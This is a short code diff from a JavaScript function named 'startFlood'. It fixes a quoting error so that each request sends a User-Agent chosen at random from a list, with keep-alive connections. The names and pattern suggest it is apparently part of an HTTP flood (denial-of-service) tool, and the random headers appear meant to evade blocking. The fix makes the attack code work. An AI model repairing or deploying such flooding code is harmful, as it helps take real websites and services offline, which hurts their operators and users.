@@ -65,7 +65,7 @@ function startFlood() {
         headers: {
           'Host': host,
           'Accept': 'application/json',
-          'User-Agent': 'userAgents[Math.floor(Math.random() * userAgents.length)],
+          'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
           'Connection': 'keep-alive'
         }
       };
